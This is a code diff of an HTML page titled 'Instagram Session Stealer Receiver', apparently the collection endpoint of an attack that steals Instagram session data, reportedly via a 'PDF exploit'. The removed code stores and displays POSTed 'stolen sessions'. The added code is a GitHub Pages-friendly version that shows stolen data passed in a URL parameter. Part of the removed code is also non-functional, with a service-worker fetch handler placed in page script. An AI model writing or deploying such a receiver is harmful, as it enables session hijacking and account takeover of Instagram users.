@@ -1,48 +1,23 @@
-<!DOCTYPE html><html><head><title>Receiver</title></head><body style="font-family:monospace;background:#000;color:lime;">
-<h2>🕵️ Instagram Session Stealer Receiver</h2>
-<div id="log">Waiting for stolen data...</div>
+<!DOCTYPE html><html><head><title>IG Receiver</title></head><body style="font-family:monospace;background:#000;color:lime;padding:20px;">
+<h2>🕵️ IG Session Receiver</h2>
+<div id="status">Send test POST → data appears here!</div>
+<pre id="log">No data yet...</pre>
 
 <script>
-// Auto-refresh stolen data every 5s
-setInterval(()=>fetch('stolen.json?t='+Date.now()).then(r=>r.json()).then(showData),5000);
-
-// Show stolen sessions
-function showData(data) {
-    const log = document.getElementById('log');
-    if(Object.keys(data).length) {
-        log.innerHTML = '';
-        Object.entries(data).forEach(([time, session]) => {
-            const div = document.createElement('div');
-            div.innerHTML = `
-                <h3>${time}</h3>
-                <pre>${JSON.stringify(session, null, 2)}</pre>
-                <hr>
-            `;
-            log.appendChild(div);
-        });
-        log.scrollTop = log.scrollHeight;
-    } else {
-        log.innerHTML = 'No sessions stolen yet...';
-    }
+// Simple GET-based receiver (GitHub Pages friendly)
+const urlParams = new URLSearchParams(window.location.search);
+if(urlParams.has('data')) {
+    const data = decodeURIComponent(urlParams.get('data'));
+    document.getElementById('log').textContent = data;
+    document.getElementById('status').innerHTML = '✅ DATA RECEIVED!';
 }
 
-// Receive POST data (from PDF exploit)
-addEventListener('fetch', event => {
-    event.respondWith(handleRequest(event.request));
-});
-
-async function handleRequest(request) {
-    if(request.method === 'POST') {
-        const data = await request.json();
-        const sessions = JSON.parse(localStorage.getItem('stolen_sessions') || '{}');
-        sessions[Date.now()] = data;
-        localStorage.setItem('stolen_sessions', JSON.stringify(sessions));
-        return new Response('STOLEN: ' + JSON.stringify(data), {status:200});
+// Auto-check URL params every 3s (for new data)
+setInterval(()=>{
+    const newData = new URLSearchParams(window.location.search).get('data');
+    if(newData && newData !== document.getElementById('log').textContent) {
+        document.getElementById('log').textContent = decodeURIComponent(newData);
     }
-    return new Response(document.documentElement.outerHTML);
-}
-
-// Load existing
-showData(JSON.parse(localStorage.getItem('stolen_sessions') || '{}'));
+}, 3000);
 </script>
 </body></html>
